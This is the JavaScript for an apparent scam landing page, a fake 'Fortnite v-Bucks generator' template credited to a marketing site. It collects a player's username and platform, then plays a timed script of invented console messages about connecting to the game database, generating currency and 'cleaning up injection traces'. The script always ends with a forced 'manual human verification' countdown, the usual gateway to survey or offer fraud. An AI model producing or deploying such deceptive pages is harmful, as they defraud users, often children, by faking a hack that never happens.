//
//
//Website Designed by CounterMind on Marketing-Rhino.com
//https://www.marketing-rhino.com/
//Skype: counter.mind
//It is forbidden to re-sell this landing page without Author Permission.
//
//
$(document).ready(function() {
	
	$('.giveaway-button').click(function () {
		$(".giveaway-button-wrapper").fadeOut(function(){
			$(".giveaway-wrapper").fadeIn();
		});
	});
	
	ion.sound({
		sounds: [
			{
				name: "swash",
				path: "audio/",
				volume: 0.2
			},
			{
				name: "success",
				path: "audio/",
				volume: 0.2
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});
	$('.click-sound').click(function() {
		ion.sound.play("swash");
	});
	
	
	// vBucks Amounts
	$vbucks_amount_1 = '2500';
	$vbucks_amount_2 = '7500';
	$vbucks_amount_3 = '13500';
	$vbucks_amount_4 = '75500';
	$selected_amount = '';
	
	// Console Messages
	var $console_message_resource_1 = 'v-Bucks';
	var $console_message_1 = 'Loading generator files...';
	var $console_message_2 = 'Extracting generator files...';
	var $console_message_3 = 'Connecting to proxy server...';
	var $console_message_4 = 'Establishing connection with game database...';
	var $console_message_5 = 'Searching for username';
	var $console_message_6 = 'Succesfully connected to username';
	var $console_message_7 = 'Preparing to generate Fortnite v-Bucks';
	var $console_message_8 = 'Generating';
	var $console_message_9 = 'Succesfully generated';
	var $console_message_10 = 'Cleaning up injection traces';
	var $console_message_11 = 'Performing automatic human verification';
	var $console_message_12 = 'Automatic human verification failed';
	var $console_message_13 = 'Manual verification required';
	
	// Human Verification Timer
	var $human_verification_timer_value = '300'; //Countdown remaing time in seconds
	
	$('#player-platform').on('change', function() {
		if(this.value == 'Windows PC' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-windows input-icon"></i>');
		} else if (this.value == 'Xbox One' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-xbox input-icon"></i>');
        } else if (this.value == 'Android' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-android input-icon"></i>');
        } else if (this.value == 'PS4' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-playstation input-icon"></i>');
        } else if (this.value == 'Nintendo' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-nintendo-switch input-icon"></i>');
		} else if (this.value == 'iOS' ) {
			$(".platform-icon-wrapper").html('<i class="fab fa-apple input-icon"></i>');
		}
	});

	function formNotValid(){
		$(".username-group").addClass('bounce animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
			$(this).removeClass('bounce animated');
		});
	}		
	$("#fortnite-player-form").validator().on("submit", function (event) {
		if (event.isDefaultPrevented()) {
			formNotValid();
		} else {
			event.preventDefault();
			$selected_platform = $( "#player-platform option:selected" ).text();			
			process2();	
		}
	});
	

	function process2(){	
		$profile_username = $( "#ftn-username" ).val();
		$.ajax({
			type: "GET",
			url: "parts/step_1.php",
			success: function(dataprocess){
				$('.changable').html(dataprocess).hide().fadeIn();										
				$('.click-sound').click(function() {
					ion.sound.play("swash");
				});
				
				$('.slick').slick({
					autoplay: false,
					dots: true,
					cssEase: 'ease-in-out',
					speed: 600
				});
				
				$selected_amount = $vbucks_amount_1;
				$selected_amount_img = "img/r-1.jpg";
				$('.slick').on('afterChange', function(event, slick, currentSlide) {
					console.log(slick, currentSlide);
					if (slick.$slides.length-4 == currentSlide) {
						$selected_amount = $vbucks_amount_1;
						$selected_amount_img = "img/r-1.jpg";
					}
					if (slick.$slides.length-3 == currentSlide) {
						$selected_amount = $vbucks_amount_2;
						$selected_amount_img = "img/r-2.jpg";
					}
					if (slick.$slides.length-2 == currentSlide) {
						$selected_amount = $vbucks_amount_3;
						$selected_amount_img = "img/r-3.jpg";
					}
					if (slick.$slides.length-1 == currentSlide) {
						$selected_amount = $vbucks_amount_4;
						$selected_amount_img = "img/r-4.jpg";
					}
				});
				$('.slick').on('beforeChange', function(event, slick, currentSlide, nextSlide){
					$('.slider-wrapper').addClass('moving');
					ion.sound.play("swash");
					$cur_amount = parseInt($('#sel-val').text());
				});
				$('.slick').on('afterChange', function(event, slick, currentSlide, nextSlide){
					$('.slider-wrapper').removeClass('moving');
					$('#sel-val').countTo({
						from: $cur_amount,
						to: $selected_amount,
						speed: 250,
						refreshInterval: 5,
						formatter: function (value, options) {
						return value.toFixed(options.decimals);
						}
					});
				});
				
				$('#generate-now').click(function() {
					if ($selected_amount == '') {
						$(".resource-shake").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
							$(this).removeClass('shake animated');
						});
					} else {
						$.ajax({
							type: "get",
							url: "parts/step_2.php",
							success: function(dataprocess){
									$console_username = $profile_username;
									$('.changable').html(dataprocess).hide().fadeIn();
									$("#console-selected-amount-img").attr("src",$selected_amount_img);
									function progressBarConsole(percent, $element) {
										var progressBarConsoleWidth = percent * $element.width() / 100;
										$element.find('div').animate({ width: progressBarConsoleWidth }, 500).html(percent + "%&nbsp;");
									}
									progressBarConsole(0, $('#progressBarConsole'));	
									
										$console_message = $('.console-message');													
										$console_message.html($console_message_1);
										setTimeout(function() {
											$('.console-progress-bar-wrapper').fadeIn();
											$console_message.html($console_message_2);
											progressBarConsole(3, $('#progressBarConsole'));
										}, 1000 );
										setTimeout(function() {
											$console_message.html($console_message_3);
											progressBarConsole(7, $('#progressBarConsole'));
										}, 2000 );
										setTimeout(function() {
											$console_message.html($console_message_4);
											progressBarConsole(10, $('#progressBarConsole'));
										}, 3200 );
										setTimeout(function() {														
											$console_message.html($console_message_5 + ' ' + $console_username);
											progressBarConsole(14, $('#progressBarConsole'));
										}, 4800 );
										setTimeout(function() {
											$(".console-loader-wrapper").fadeOut(function(){
												$(".console-username-wrapper").fadeIn(function(){
													$('#console-username-val').html($console_username);
													$('#console-platform-val').html($selected_platform);
													$($console_message).addClass('animated infinite pulse');
												});
											});
											progressBarConsole(17, $('#progressBarConsole'));
										}, 4800 );
										setTimeout(function() {
											$console_message.html("<span class='c-message-success'>" + $console_message_6 + ' ' + $console_username + "</span>");
											$($console_message).removeClass('animated infinite jello');
											$('.console-username-wrapper').removeClass('animated infinite pulse');											
											$('.console-username-wrapper').addClass('connected');
											$('.console-username-wrapper').addClass('animated bounce');
											ion.sound.play("success");
											progressBarConsole(25, $('#progressBarConsole'));
										}, 8500 );
										setTimeout(function() {
											$(".console-username-wrapper").fadeOut(function(){
												$('.console-loader-wrapper').fadeIn();
												$console_message.html($console_message_7);
											});																			
											progressBarConsole(28, $('#progressBarConsole'));
										}, 9500 );
										setTimeout(function() {
											var $vbucks_count_to = $selected_amount;
											$console_message.html("<span class='c-r-value-label'>" + $console_message_8 + "&nbsp;<span class='c-r-value-r-1-accent'>" + $selected_amount + "</span>&nbsp;" + $console_message_resource_1) + "</span>";
											$(".console-loader-wrapper").fadeOut(function(){
												$('.console-message-wrapper').animate({"bottom":"25px"}, "fast");
												$('.console-count-to-wrapper').fadeIn(function(){
													$('#console-amount').countTo({
														from: 0,
														to: $selected_amount,
														speed: 2000,
														refreshInterval: 5,
														formatter: function (value, options) {
														return value.toFixed(options.decimals);
														}
													});
												});
											});									
											progressBarConsole(32, $('#progressBarConsole'));
										}, 12500 );
										setTimeout(function() {
											$('.console-count-to-wrapper').addClass('connected animated bounce');
											$console_message.html("<span class='c-message-success'>" + $console_message_9 + "&nbsp;<span class='c-r-value-r-1-accent'>" + $selected_amount + "</span>&nbsp;" + $console_message_resource_1) + "</span>";	
											ion.sound.play("success");
											progressBarConsole(55, $('#progressBarConsole'));
										}, 16000 );
										setTimeout(function() {
											$(".console-count-to-wrapper").fadeOut(function(){
												$('.console-message-wrapper').animate({"bottom":"60px"}, "fast");
												$('.console-loader-wrapper').fadeIn();
												$console_message.html($console_message_10);		
												progressBarConsole(87, $('#progressBarConsole'));
											});									
										}, 18100 );
										setTimeout(function() {
											$console_message.html($console_message_11);	
											progressBarConsole(90, $('#progressBarConsole'));
										}, 19800 );
										setTimeout(function() {
											$console_message.html("<span class='c-message-error'>" + $console_message_12 + "</span>");	
											progressBarConsole(92, $('#progressBarConsole'));
										}, 21200 );
										setTimeout(function() {			
											$console_message.html($console_message_13);
											progressBarConsole(95, $('#progressBarConsole'));
										}, 22800 );
										setTimeout(function() {
											$('.console-wrapper').fadeOut(function(){
												$(".human-verification-wrapper").fadeIn(function(){
													human_verification_timer.init($human_verification_timer_value);																
												});
											});
										}, 24500 );
									
								
							},
							error: function(){
								
							}
						});
					}
				});
			},
			error: function(){
				alert("An error occured");
			}
		});	
	}
	
	$('.popup-tos').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-contact').magnificPopup({
        type: 'inline',
        preloader: false
    });
    $('.popup-pp').magnificPopup({
        type: 'inline',
        preloader: false
    });


	
	

	function rng(min, max) {
		return Math.floor(Math.random() * (max - min + 1) + min);

	}


	function Random(_0xaa63x2, _0xaa63x3) {
		return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
	};
	
});

function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
	
//
//
//Website Designed by CounterMind on Marketing-Rhino.com
//https://www.marketing-rhino.com/
//Skype: counter.mind
//It is forbidden to re-sell this landing page without Author Permission.
//
//